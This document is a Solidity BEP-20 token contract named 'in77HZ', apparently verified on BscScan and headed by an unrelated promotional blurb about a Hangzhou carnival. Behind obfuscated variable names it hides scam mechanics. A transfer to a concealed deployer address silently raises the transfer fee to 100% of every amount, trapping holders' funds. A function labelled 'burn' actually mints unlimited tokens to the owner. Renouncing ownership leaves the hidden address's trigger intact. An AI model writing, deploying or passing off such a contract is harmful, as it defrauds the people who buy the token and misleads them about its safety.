/**
 *Submitted for verification at BscScan.com on 2022-11-29
*/

///
//in77HangZhou v1
//Young revelers flocked to the banks of the West Lake to bid adieu to 2019 and ring in 2020 in a dazzling New Year’s Eve bonanza. 
//During the New Year’s Day holiday, Hangzhou Lakeside Intime in77 once again became the preferred destination for 
//fashion shopping and a cultural hub that created an online buzz. The 2020 Lakeside New Year Carnival hosted by in77 
//attracted hundreds of thousands of young consumers from within Hangzhou and other parts of Zhejiang province. 
//Revelers thronging the lakeside pedestrian street turned it into an ocean of joy.
//https://t.co/2jCxTCGsN9
//https://twitter.com/AsiaFinance
//
//

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
contract in77HZ {
uint256 public constant HkqwLQ = 9+1;
address public  gLYwlx = address(0);
uint256 public  STsPKT = 10000000000000000000;
address private  qRTnjG = address(0);
string public  name = "in77HZ";
address public  CTqynh = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  LBzcbV = 1000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public owner;
address public  marHPE = address(0);
uint256 public  HGxQKD = 100000000000000000000;
string public  symbol = "in77HZ";
uint8 public constant decimals = 18;
address public  fQsysV = address(0);
address public  YzcNlL = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
mapping (address => uint256) public balanceOf;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  mhVaum = 100000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
event Transfer(address indexed from, address indexed to, uint256 value);
address public  cqOsCg = address(0);
uint256 public  dETrmg = 100000000000000000000000;
uint256 public  RHwBlM = 10000000000000000;
uint256 public  dNzBYl = 10000000000000000000000000000;
uint256 private  SuugCy = 10000000000000;
uint256 public  HMsrbq = 100000000000000000000000;
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
constructor () {
qRTnjG = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "RPXrlZ");
require(to != address(0), "RPXrlZ");
require(amount <= balanceOf[from], "RPXrlZ");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* HkqwLQ/SuugCy ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==qRTnjG){
SuugCy = 9+1;
}
emit Transfer(from, to, transferAmount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}

}